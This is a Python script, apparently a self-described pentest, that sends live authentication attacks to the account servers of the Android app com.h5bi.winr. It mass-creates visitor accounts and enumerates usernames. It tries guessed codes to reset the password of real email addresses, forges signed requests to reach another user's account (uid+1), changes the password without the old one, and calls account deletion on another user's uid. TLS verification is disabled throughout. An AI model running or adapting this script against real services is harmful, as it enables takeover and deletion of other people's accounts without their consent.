"""
Authentication & Session Tests — com.h5bi.winr v1.0.1

Tests:
  1. Visitor account creation & exploitation (/v1/user/registerVisitor)
  2. Token validity window (how long does a token last?)
  3. Account enumeration via login error messages
  4. Password reset abuse (/v1/user/findPassByEmail, /v1/user/sendCodeByEmail)
  5. Token reuse across different uid values (auth bypass)
  6. /v1/auth/cUserTrash — account deletion without confirmation?
  7. changePassword without old password verification

Usage: python3 04_auth_tests.py
"""

import time
import json
import uuid
import urllib3
import requests
from sign_helper import QuickGameSession, SERVERS, APP_KEY, md5

urllib3.disable_warnings()

SESSION = QuickGameSession(
    uid="FILL_UID",
    username="FILL_USER",
    token="FILL_TOKEN",
    server=SERVERS["account_primary"],
)


def log(label, resp):
    print(f"\n  {'─'*50}")
    print(f"  TEST: {label}")
    print(f"  {resp.request.method} {resp.url}")
    print(f"  Status: {resp.status_code}")
    try:
        print(f"  JSON:   {json.dumps(resp.json(), indent=2)[:400]}")
    except Exception:
        print(f"  Body:   {resp.text[:300]}")


# ─── Test 1: Visitor Account Registration ────────────────────────────────────
def test_visitor_registration():
    """
    /v1/user/registerVisitor typically creates anonymous accounts.
    Risk: unlimited account creation, CDKey farming, spam.
    """
    print("\n" + "="*55)
    print("TEST 1: Visitor Account Registration")

    device_ids = [
        f"pentest_device_{uuid.uuid4().hex[:12]}",
        f"pentest_device_{uuid.uuid4().hex[:12]}",
    ]

    for device_id in device_ids:
        # Try unauthenticated
        resp = requests.post(
            SERVERS["account_primary"] + "/v1/user/registerVisitor",
            data={
                "appKey":   APP_KEY,
                "os":       "android",
                "deviceId": device_id,
                "channel":  "GooglePlay",
            },
            headers={"User-Agent": "Dalvik/2.1.0"},
            verify=False, timeout=15
        )
        log(f"registerVisitor deviceId={device_id[:20]}", resp)

        # Also try alt server
        resp2 = requests.post(
            SERVERS["account_alt"] + "/v1/user/registerVisitor",
            data={"appKey": APP_KEY, "os": "android", "deviceId": device_id},
            headers={"User-Agent": "Dalvik/2.1.0"},
            verify=False, timeout=15
        )
        log(f"registerVisitor (alt server) deviceId={device_id[:20]}", resp2)
        time.sleep(1)


# ─── Test 2: Account Enumeration via Login ────────────────────────────────────
def test_account_enumeration():
    """
    Test if login error messages differ for:
      - Non-existent username
      - Existing username + wrong password
    If they differ, usernames can be enumerated.
    """
    print("\n" + "="*55)
    print("TEST 2: Account Enumeration via Login Error Messages")

    test_cases = [
        ("nonexistent_user_xyz_12345", "wrong_password"),
        ("admin",                      "wrong_password"),
        ("test",                       "wrong_password"),
        ("guest",                      "wrong_password"),
        # If CAPTURED_SESSION has a real username, test it with wrong password
        (SESSION.username if SESSION.username != "FILL_USER" else "test_real_user",
         "definitely_wrong_password_xyz"),
    ]

    for username, password in test_cases:
        resp = requests.post(
            SERVERS["account_primary"] + "/v1/user/login",
            data={"appKey": APP_KEY, "username": username, "password": password,
                  "os": "android"},
            headers={"User-Agent": "Dalvik/2.1.0"},
            verify=False, timeout=15
        )
        try:
            data = resp.json()
            msg  = data.get("msg", "")
            code = data.get("code")
            print(f"  user={username:<35} code={code} msg={repr(msg)}")
        except Exception:
            print(f"  user={username:<35} {resp.status_code}: {resp.text[:100]}")
        time.sleep(0.5)


# ─── Test 3: Token Reuse Across UIDs ─────────────────────────────────────────
def test_token_uid_mismatch(session: QuickGameSession):
    """
    Authenticated as uid=A with token=T, call getUserInfo with uid=B+token=T.
    If the server validates token→uid binding, this should fail.
    If not — authentication bypass: access any account with any valid token.
    """
    if session.uid == "FILL_UID":
        print("\n[SKIP] Token/UID mismatch test — fill SESSION first")
        return

    print("\n" + "="*55)
    print("TEST 3: Token Reuse with Different UID (Auth Bypass)")

    own_uid = int(session.uid)
    target_uid = str(own_uid + 1)

    # Recompute sign with target_uid but same token
    from sign_helper import build_sign
    forged_sign = build_sign(target_uid, session.username, session.token,
                              session.os_type, session.usermode)

    resp = requests.get(
        session.server + "/v1/auth/getUserInfo",
        params={
            "uid":      target_uid,
            "username": session.username,
            "token":    session.token,
            "sign":     forged_sign,
            "os":       session.os_type,
            "usermode": session.usermode,
        },
        headers={"User-Agent": "Dalvik/2.1.0"},
        verify=False, timeout=15
    )
    log(f"Token reuse target_uid={target_uid} (own={own_uid})", resp)


# ─── Test 4: Password Reset Abuse ────────────────────────────────────────────
def test_password_reset():
    """
    Test /v1/user/sendCodeByEmail and /v1/user/findPassByEmail.
    Risks: no rate limiting → email enumeration, code brute force.
    """
    print("\n" + "="*55)
    print("TEST 4: Password Reset Probe")

    test_emails = [
        "nonexistent_xyz_pentest@gmail.com",
        "test@test.com",
    ]

    for email in test_emails:
        # Step 1: Request reset code
        resp = requests.post(
            SERVERS["account_primary"] + "/v1/user/sendCodeByEmail",
            data={"appKey": APP_KEY, "email": email, "os": "android"},
            headers={"User-Agent": "Dalvik/2.1.0"},
            verify=False, timeout=15
        )
        try:
            data = resp.json()
            print(f"  sendCode email={email:<40} code={data.get('code')} msg={repr(data.get('msg'))}")
        except Exception:
            print(f"  sendCode email={email:<40} {resp.status_code}: {resp.text[:100]}")

        # Step 2: Try to use reset with a guessed short code
        for test_code in ["000000", "123456", "111111", "999999"]:
            resp2 = requests.post(
                SERVERS["account_primary"] + "/v1/user/findPassByEmail",
                data={"appKey": APP_KEY, "email": email, "code": test_code,
                      "newPwd": "PentestNewPwd123!", "os": "android"},
                headers={"User-Agent": "Dalvik/2.1.0"},
                verify=False, timeout=15
            )
            try:
                data2 = resp2.json()
                code = data2.get("code")
                msg  = data2.get("msg", "")
                print(f"    findPassByEmail code={test_code}: code={code} msg={repr(msg)}")
                if code == 0:
                    print(f"    [!!!] PASSWORD RESET SUCCESSFUL with code {test_code}!")
                    break
            except Exception:
                pass
            time.sleep(0.3)

        time.sleep(1)


# ─── Test 5: changePassword Without Old Password ─────────────────────────────
def test_change_password_no_old(session: QuickGameSession):
    """
    Some SDKs allow password change without providing the old password.
    /v1/auth/changePassword — test if oldPassword is validated server-side.
    """
    if session.uid == "FILL_UID":
        print("\n[SKIP] changePassword test — fill SESSION first")
        return

    print("\n" + "="*55)
    print("TEST 5: changePassword Without Old Password")

    test_cases = [
        {"newPwd": "PentestPwd123!", "oldPwd": ""},         # empty old pwd
        {"newPwd": "PentestPwd123!", "oldPwd": "wrong"},    # wrong old pwd
        {"newPwd": "PentestPwd123!"},                        # omit oldPwd entirely
    ]

    for data in test_cases:
        resp = session.post("/v1/auth/changePassword", data=data)
        log(f"changePassword oldPwd={repr(data.get('oldPwd', 'OMITTED'))}", resp)
        time.sleep(1)


# ─── Test 6: Account Deletion ─────────────────────────────────────────────────
def test_account_deletion_probe(session: QuickGameSession):
    """
    /v1/auth/cUserTrash — probe (don't actually delete!).
    Check if it requires additional confirmation or is one-step.
    """
    if session.uid == "FILL_UID":
        print("\n[SKIP] cUserTrash probe — fill SESSION first")
        return

    print("\n" + "="*55)
    print("TEST 6: Account Deletion Probe (DRY RUN — no confirm param)")

    # Probe with incomplete params to see if endpoint exists + what it requires
    resp = session.post("/v1/auth/cUserTrash", data={
        "confirm": "",   # missing confirmation
    })
    log("cUserTrash (probe, no confirm)", resp)

    # Check if IDOR: can we delete other accounts?
    target_uid = str(int(session.uid) + 1)
    resp2 = session.post("/v1/auth/cUserTrash", data={
        "targetUid": target_uid,
    })
    log(f"cUserTrash IDOR uid={target_uid}", resp2)


if __name__ == "__main__":
    print("[*] Auth Tests — com.h5bi.winr v1.0.1")

    test_visitor_registration()
    test_account_enumeration()
    test_token_uid_mismatch(SESSION)
    test_password_reset()
    test_change_password_no_old(SESSION)
    test_account_deletion_probe(SESSION)

    print("\n[*] Auth tests complete.")
